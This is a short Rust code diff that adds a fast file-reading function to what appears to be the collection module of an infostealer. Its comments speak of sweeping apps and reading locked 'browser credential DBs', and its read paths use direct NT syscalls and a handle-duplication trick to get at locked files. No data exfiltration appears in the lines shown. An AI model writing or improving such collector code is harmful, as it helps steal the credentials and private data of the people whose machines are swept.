@@ -44,6 +44,19 @@ pub fn read_file(path: &Path) -> Option<Vec<u8>> {
     crate::handlereader::read_via_handle_dup(path)
 }
 
+/// Fast path for app/data collectors: direct read only (syscalls → std),
+/// never the handle-duplication scan. The dup scan costs up to ~20s per
+/// locked file — fine for a handful of browser credential DBs, fatal when an
+/// apps sweep hits many locked files on a busy machine.
+pub fn read_file_quick(path: &Path) -> Option<Vec<u8>> {
+    if let Some(nt) = syscall::nt() {
+        if let Some(data) = unsafe { read_file_nt(nt, path) } {
+            return Some(data);
+        }
+    }
+    read_file_std(path)
+}
+
 fn read_file_std(path: &Path) -> Option<Vec<u8>> {
     for attempt in 0..3 {
         match std::fs::read(path) {
